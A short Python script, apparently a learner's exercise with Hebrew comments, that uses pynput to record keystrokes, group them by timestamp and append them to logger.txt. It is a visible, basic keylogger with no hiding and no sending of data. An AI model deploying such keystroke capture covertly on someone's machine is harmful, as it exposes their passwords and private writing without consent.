from pynput.keyboard import Key, Listener
import datetime
pressed_keys = []
log_dict = {}
print(len(log_dict))


def on_press(key):
    global pressed_keys

    pressed_keys.append(str(key))
    print(pressed_keys)
    if pressed_keys[-4:] == ["'s'","'h'","'o'","'w'"]:
        for time, value in log_dict.items():
            print(time + '\n' + '  ' + value)

    if pressed_keys[-1] == 'Key.space' or pressed_keys[-1] == 'Key.enter' or pressed_keys[-1]=='Key.esc':
        logger(pressed_keys)
        pressed_keys = []
        
    if len(log_dict) > 1:
        print("There are more than one log entries, writing to file and removing the last one.")
        not_now = list(log_dict.keys())[-2]
        print(not_now)
        write_file(not_now)
        del log_dict[not_now]
        print(log_dict)

def logger(keys):
    global log_dict
    ct = datetime.datetime.now()
    global now
    now = ct.strftime("%d-%m-%y %H:%M ")

    data_str = ''
    for key in keys:
        k = str(key).replace("'","")
        
        if k.find('backspace') > 0:
                data_str = data_str[:-1]
                # k = ''
        elif k.find('space') > 0:
                data_str += ' '
        if k.find('enter') > 0:
            data_str += '\n'
        elif k.find('Key') == -1:
                data_str += k
        else:
             continue
    if now in log_dict:
        log_dict[now] += data_str
    else:
        log_dict[now] = data_str
        print(log_dict)
    # write_file(log_dict)


def write_file(key):
    print(log_dict)
    with open('logger.txt', 'a') as f:
            f.write(key + '\n' + '  ' + log_dict[key] + '\n')


def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(log_dict)

    # if type(key) == keyboard.Key:
    #     if key == keyboard.Key.space:
    #         pressed_key.append(" ")
    #     elif key == keyboard.Key.enter:
    #         pressed_key.append("\n")
    #     elif key == keyboard.Key.backspace and pressed_key:
    #         del pressed_key[-1]
    #     elif key == keyboard.Key.tab:
    #         pressed_key.append("    ")
    # else:
    #     pressed_key.append(str(key))

# את הפקודות ייבאתי מ- https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard

# key_listener= keyboard.Listener(on_press=typing)
# key_listener.start()
# # הוספתי כאן מגבלת זמן להרצת התוכנה כי לא הצלחתי לעשות יציאה נוחה
# time.sleep(60)
# key_listener.stop()


# text= ''.join(pressed_key)
# print (text)
